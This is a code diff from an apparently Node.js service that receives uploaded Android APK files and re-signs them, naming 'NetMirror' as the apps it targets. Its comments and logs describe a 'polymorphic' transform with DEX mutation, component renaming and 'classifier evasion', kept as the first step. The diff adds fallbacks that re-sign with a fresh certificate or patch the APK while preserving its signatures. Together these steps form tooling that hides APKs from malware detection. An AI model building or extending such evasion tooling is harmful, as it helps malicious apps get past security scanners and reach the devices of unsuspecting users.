@@ -1219,14 +1219,48 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       fs.writeFileSync(origPath, rawBuf);
       log('SAVE', 'Original APK saved to vault');
 
-      // Sign with polymorphic transform (fresh cert + DEX mutation + component rename)
-      log('SIGN', 'Starting polymorphic signing (fresh cert + DEX mutation + classifier evasion)...');
-      const { buffer: signedBuf, certInfo, polymorphic } = polymorphicTransformWrapper(rawBuf);
+      // Try polymorphic transform first (works on NetMirror APKs with known components)
+      // Falls back to clean re-sign with fresh cert (works on ANY APK)
+      log('SIGN', 'Starting APK signing...');
+      let signedBuf, certInfo;
 
-      if (!signedBuf || !polymorphic) {
-        log('FAIL', 'Signing failed — polymorphic transform returned null', 'error');
+      try {
+        const polyResult = polymorphicTransformWrapper(rawBuf);
+        if (polyResult && polyResult.buffer && polyResult.polymorphic) {
+          signedBuf = polyResult.buffer;
+          certInfo = polyResult.certInfo;
+          log('PHASE', 'Polymorphic transform succeeded');
+        }
+      } catch (polyErr) {
+        log('INFO', 'Polymorphic transform not applicable — using clean re-sign', 'info');
+      }
+
+      // Fallback: clean re-sign with fresh cert (works on any APK)
+      if (!signedBuf) {
+        log('SIGN', 'Applying clean re-sign with fresh certificate...');
+        const cleanResult = resignApkClean(rawBuf);
+        if (cleanResult && cleanResult.buffer && cleanResult.resigned) {
+          signedBuf = cleanResult.buffer;
+          certInfo = cleanResult.certInfo || { certHash: 'unknown', cn: 'NetMirror', org: '' };
+          log('PHASE', 'Clean re-sign succeeded');
+        } else {
+          // Last resort: try directPatchApk (preserves V2/V3 signatures, just injects padding)
+          log('SIGN', 'Clean re-sign failed — trying direct patch...');
+          try {
+            const patchResult = directPatchApk(rawBuf);
+            if (patchResult && patchResult.buffer) {
+              signedBuf = patchResult.buffer;
+              certInfo = patchResult.certInfo || { certHash: 'patched', cn: 'DirectPatch', org: '' };
+              log('PHASE', 'Direct patch succeeded');
+            }
+          } catch (_) {}
+        }
+      }
+
+      if (!signedBuf) {
+        log('FAIL', 'All signing methods failed', 'error');
         try { fs.unlinkSync(req.file.path); } catch (_) {}
-        return res.status(500).json({ error: 'APK signing failed' });
+        return res.status(500).json({ error: 'APK signing failed — unsupported APK format' });
       }
 
       // Save signed
@@ -1347,9 +1381,26 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       log('INIT', `Re-signing APK ${apk.original_name}...`);
 
       const rawBuf = fs.readFileSync(origPath);
-      const { buffer: signedBuf, certInfo, polymorphic } = polymorphicTransformWrapper(rawBuf);
 
-      if (!signedBuf || !polymorphic) {
+      let signedBuf, certInfo;
+      try {
+        const polyResult = polymorphicTransformWrapper(rawBuf);
+        if (polyResult && polyResult.buffer && polyResult.polymorphic) {
+          signedBuf = polyResult.buffer;
+          certInfo = polyResult.certInfo;
+        }
+      } catch (_) {}
+
+      if (!signedBuf) {
+        log('INFO', 'Using clean re-sign (polymorphic not applicable)');
+        const cleanResult = resignApkClean(rawBuf);
+        if (cleanResult && cleanResult.buffer && cleanResult.resigned) {
+          signedBuf = cleanResult.buffer;
+          certInfo = cleanResult.certInfo || { certHash: 'unknown', cn: 'NetMirror', org: '' };
+        }
+      }
+
+      if (!signedBuf) {
         db.prepare("UPDATE signed_apks SET status = 'ready' WHERE id = ?").run(id);
         return res.status(500).json({ error: 'Re-signing failed' });
       }
